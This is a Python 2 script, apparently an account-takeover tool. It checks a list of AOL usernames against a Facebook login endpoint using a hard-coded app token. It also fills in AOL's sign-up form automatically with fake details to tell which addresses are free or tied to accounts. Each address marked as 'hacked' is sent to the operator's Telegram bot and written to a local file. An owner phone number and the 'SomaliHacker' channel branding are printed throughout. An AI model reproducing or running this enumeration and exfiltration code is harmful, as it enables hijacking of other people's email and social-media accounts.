#!/usr/bin/python2
#coding=utf-8
try:
	import webbrowser
	import threading
	import requests
	import random
	import sys
	import os
	import time
	import mechanize
	from datetime import datetime
	from mechanize import Browser
	os.system('clear')

except ImportError:
	os.system('pip2 install requests')
	os.system('pip2 install random')
	os.system('pip2 install sys')
	os.system('pip2 install os')
	os.system('pip2 install time')
	os.system('pip2 install mechanize')
	os.sytem('clear')
	os.system('python2 Aol_V2.py')


logo = '''

\033[1;94m┏━┓┏━┳━━━┳┓╋┏┳━━━┓
┃┃┗┛┃┃┏━┓┃┃╋┃┃┏━┓┃
┃┏┓┏┓┃┃╋┃┃┗━┛┃┃╋┃┃
┃┃┃┃┃┃┃╋┃┃┏━┓┃┗━┛┃
┃┃┃┃┃┃┗━┛┃┃╋┃┃┏━┓┃
┗┛┗┛┗┻━━━┻┛╋┗┻┛╋┗┛\033[1;37m'''

os.system('rm -rf .txt')
os.system('rm -rf hacked.txt')
os.system('rm -rf cps.txt')
os.system('rm -rf error.txt')

a = 0
b = 0
c = 0
d = 0
sara = 0

hac = []

try:
	monan = open('.tok.txt', 'r').readlines()
	token = monan[0].strip()
	id = monan[1].strip()
except IndexError:
	os.system('clear')
	print(logo)
	print('')
	print('')
	token = raw_input('TOKEN :\033[1;33m ')
	zuum = open('.tok.txt', 'w')
	zuum.write(token+'\n')
	zuum.close()
	id = raw_input('\033[1;37mID :\033[1;33m ')
	saam = open('.tok.txt', 'a')
	saam.write(id)
	saam.close()
	time.sleep(2)

		
except IOError:
	os.system('clear')
	print(logo)
	print('')
	print('')
	token = raw_input('TOKEN :\033[1;33m ')
	zuum = open('.tok.txt', 'w')
	zuum.write(token+'\n')
	zuum.close()
	id = raw_input('\033[1;37mID :\033[1;33m ')
	saam = open('.tok.txt', 'a')
	saam.write(id)
	saam.close()
	time.sleep(2)
	

try:
	os.system('clear')
	print(logo)
	print('')
	print('')
	email = raw_input('\033[1;37mEnter a file name:\033[1;33m ')
	time.sleep(1)
	muwa = open(email, 'r').readlines()
	


	count = 0
	total = open(email, 'r').readlines()
	for line in total:
		count += 1

	output = open('.txt', 'w')
	for line in muwa:
		output.write(line.replace('@aol.com', '').replace('|Locked account', ''))
	output.close()
except IOError:
	os.system('clear')
	print(logo)
	print('')
	print('')
	print('File doesnot exist . TRY AGAIN!')
	os.system('python2 mohan.py')

os.system('clear')
print(logo)
print('')
print('')
print('\033[1;32m[ + ] CRACK STARTED...\033[1;37m')
print('')
print('\033[1;33m[ + ] CRACKED :  ' + str(sara) +' / '+ str(count)+ '\033[1;37m')
print('')
print('\033[1;33m[ + ] TOTAL ACCOUNTS :  {}'.format(count) + '\033[1;37m')
print('')
print('\033[1;32m[ ✓ ] HACKED :  {}'.format(a) + '\033[1;37m')
print('')
print('\033[1;31m[ x ] NOT HACKED :  {}'.format(b) + '\033[1;37m')
print('')
print('\033[1;31m[ ! ] ERROR :  {}'.format(c) + '\033[1;37m')
print('')
print('\033[1;32m[ ✓ ] SENT TELEGRAM :  {}'.format(d) + '\033[1;37m')
print('')
print('\033[1;33m[ + ] OWNER # :  +252636722527'+'\033[1;37m')
print('')
print('-----------------------------')
print('')




mula = open('.txt', 'r').readlines()

for line in mula:
	try:
		nagm = line.strip()+'@aol.com'
		url_fb = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password=password&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(nagm)
		osi = requests.get(url_fb).text
		br = mechanize.Browser()
		br.set_handle_robots(False)
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
		br.open('https://login.aol.com/account/create?specId=yidReg&done=https%3A%2F%2Fwww.aol.com')
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['firstName'] = 'Moha'
		br.form['lastName'] = 'Abdi'
		br.form['yid'] = line
		br.form['password'] = 'maalaa0o'
		br['shortCountryCode'] = ['SO']
		br.form['phone'] = '0634501226'
		br['mm'] = ['1']
		br.form['dd'] = '11'
		br.form['yyyy'] = '1979'
		br.form['freeformGender'] = 'Male'
		br.submit()
		sara += 1
		br._factory.is_html = True
		moha = br.geturl()
		print('')
		print(osi)
		print('')
		print(moha)
		print('')
		time.sleep(1)

		if 'The password you entered is incorrect. Please try again.' in osi and 'https://login.aol.com/account/challenge/' in moha:
			domain = '@aol.com'
			sbal = str(sara) + ' / ' + str(count)
			saka = line.strip()+domain
			now = datetime.now()
			Time = now.strftime("%H:%M:%S")
			bot_message = "Hi 𝕄𝕆ℍ𝔸℡ ̇༗. I Fucked New Account ✅ "+"\n━━━━━━━━━━━━"+"\n.❖. 𝐄𝐌𝐀𝐈𝐋: "+saka+"\n.❖. 𝐓𝐈𝐌𝐄: "+Time+"\n.❖. 𝐂𝐑𝐀𝐂𝐊𝐈𝐍𝐆...: "+sbal+"\n.❖. 𝐎𝐖𝐍𝐄𝐑: MOHA"+"\n━━━━━━━━━━━━\n𝗖𝗛:- 𝗦𝗼𝗺𝗮𝗹𝗶𝗛𝗮𝗰𝗸𝗲𝗿"
			bot_token = token
			bot_chatID = id
			send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
			response = requests.get(send_text)
			a += 1
			d += 1
			hac.append('\033[1;32m[ MOHA HACKED ] '+line.strip()+domain+'\n')
			sep = ' \n'
			mum = open('hacked.txt', 'a')
			mum.write(line.strip() + domain + '\n')
			mum.close()
			os.system('clear')
			print(logo)
			print('')
			print('')
			print('\033[1;32m[ + ] CRACK STARTED...\033[1;37m')
			print('')
			print('\033[1;33m[ + ] CRACKED :  ' + str(sara) + ' / ' + str(count) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] TOTAL ACCOUNTS :  {}'.format(count) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] HACKED :  {}'.format(a) + '\033[1;37m')
			print('')
			print('\033[1;31m[ x ] NOT HACKED :  {}'.format(b) + '\033[1;37m')
			print('')
			print('\033[1;31m[ ! ] ERROR :  {}'.format(c) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] SENT TELEGRAM :  {}'.format(d) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] OWNER # :  +252636722527' + '\033[1;37m')
			print('-----------------------------')
			print('')
			print(sep.join(hac))
		elif 'The password you entered is incorrect. Please try again.' in osi and moha == 'https://login.aol.com/account/create?specId=yidreg&done=https%3A%2F%2Fwww.aol.com&intl=us&context=reg':
			domain = '@aol.com'
			sep = ' \n'
			b += 1
			muwah = open('cps.txt', 'a')
			muwah.write(line.strip() + domain + '\n')
			muwah.close()
			os.system('clear')
			print(logo)
			print('')
			print('')
			print('\033[1;32m[ + ] CRACK STARTED...\033[1;37m')
			print('')
			print('\033[1;33m[ + ] CRACKED :  ' + str(sara) + ' / ' + str(count) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] TOTAL ACCOUNTS :  {}'.format(count) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] HACKED :  {}'.format(a) + '\033[1;37m')
			print('')
			print('\033[1;31m[ x ] NOT HACKED :  {}'.format(b) + '\033[1;37m')
			print('')
			print('\033[1;31m[ ! ] ERROR :  {}'.format(c) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] SENT TELEGRAM :  {}'.format(d) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] OWNER # :  +252636722527' + '\033[1;37m')
			print('')
			print('-----------------------------')
			print('')
			print(sep.join(hac))
	
		elif "The email you entered doesn't appear to belong to an account. Please check your email address and try again." in osi and "https://login.aol.com/account/challenge/" in moha:
			sep = ' \n'
			b += 1
			domain = '@aol.com'
			muwah = open('cps.txt', 'a')
			muwah.write(line.strip() + domain + '\n')
			muwah.close()
			os.system('clear')
			print(logo)
			print('')
			print('')
			print('\033[1;32m[ + ] CRACK STARTED...\033[1;37m')
			print('')
			print('\033[1;33m[ + ] CRACKED :  ' + str(sara) + ' / ' + str(count) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] TOTAL ACCOUNTS :  {}'.format(count) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] HACKED :  {}'.format(a) + '\033[1;37m')
			print('')
			print('\033[1;31m[ x ] NOT HACKED :  {}'.format(b) + '\033[1;37m')
			print('')
			print('\033[1;31m[ ! ] ERROR :  {}'.format(c) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] SENT TELEGRAM :  {}'.format(d) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] OWNER # :  +252636722527' + '\033[1;37m')
			print('-----------------------------')
			print('')
			print(sep.join(hac))

		elif "The email you entered doesn't appear to belong to an account. Please check your email address and try again." in osi and moha == 'https://login.aol.com/account/create?specId=yidreg&done=https%3A%2F%2Fwww.aol.com&intl=us&context=reg':
			sep = ' \n'
			b += 1
			domain = '@aol.com'
			muwah = open('cps.txt', 'a')
			muwah.write(line.strip() + domain + '\n')
			muwah.close()
			os.system('clear')
			print(logo)
			print('')
			print('')
			print('\033[1;32m[ + ] CRACK STARTED...\033[1;37m')
			print('')
			print('\033[1;33m[ + ] CRACKED :  ' + str(sara) + ' / ' + str(count) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] TOTAL ACCOUNTS :  {}'.format(count) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] HACKED :  {}'.format(a) + '\033[1;37m')
			print('')
			print('\033[1;31m[ x ] NOT HACKED :  {}'.format(b) + '\033[1;37m')
			print('')
			print('\033[1;31m[ ! ] ERROR :  {}'.format(c) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] SENT TELEGRAM :  {}'.format(d) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] OWNER # :  +252636722527' + '\033[1;37m')
			print('-----------------------------')
			print('')
			print(sep.join(hac))

		else:
			sep = ' \n'
			c += 1
			domain = '@aol.com'
			meme = open('error.txt', 'a')
			meme.write(line.strip() + domain + '\n')
			meme.close()
			os.system('clear')
			print(logo)
			print('')
			print('')
			print('\033[1;32m[ + ] CRACK STARTED...\033[1;37m')
			print('')
			print('\033[1;33m[ + ] CRACKED :  ' + str(sara) + ' / ' + str(count) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] TOTAL ACCOUNTS :  {}'.format(count) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] HACKED :  {}'.format(a) + '\033[1;37m')
			print('')
			print('\033[1;31m[ x ] NOT HACKED :  {}'.format(b) + '\033[1;37m')
			print('')
			print('\033[1;31m[ ! ] ERROR :  {}'.format(c) + '\033[1;37m')
			print('')
			print('\033[1;32m[ ✓ ] SENT TELEGRAM :  {}'.format(d) + '\033[1;37m')
			print('')
			print('\033[1;33m[ + ] OWNER # :  +252636722527' + '\033[1;37m')
			print('-----------------------------')
			print('')
			print(sep.join(hac))
			

	except requests.exceptions.HTTPError as e:
		domain = '@aol.com'
		meme = open('error.txt', 'a')
		meme.write(line.strip() + domain + '\n')
		meme.close()
		print('Http Error: ', e)
		c += 1
		if c > 5:
			exit()
			sleep(30)



	except requests.exceptions.ConnectionError as e:
		domain = '@aol.com'
		meme = open('error.txt', 'a')
		domain = '@aol.com'
		meme.write(line.strip() + domain + '\n')
		meme.close()
		print('Error Connecting: ', e)
		c += 1
		if c > 5:
			exit()
			sleep(30)

	except mechanize.HTTPError as e:
		domain = '@aol.com'
		meme = open('error.txt', 'a')
		meme.write(line.strip() + domain + '\n')
		meme.close()
		print('Mechanize Http Error', e.code)
		c += 1
		if c > 5:
			exit()
			sleep(30)

	except mechanize.URLError as e:
		domain = '@aol.com'
		meme = open('error.txt', 'a')
		meme.write(line.strip() + domain + '\n')
		meme.close()
		print('Mechanize URL Error:', e.reason.args)
		c += 1
		if c > 5:
			exit()
			sleep(30)
			
	#except httplib.BadStatusLine, e:
		#sba = open('error.txt', 'a')
		#sba.write(line.strip() + domain + '\n')
		#sba.close()
		#print('Bad Status Line: ', repr(e.line))

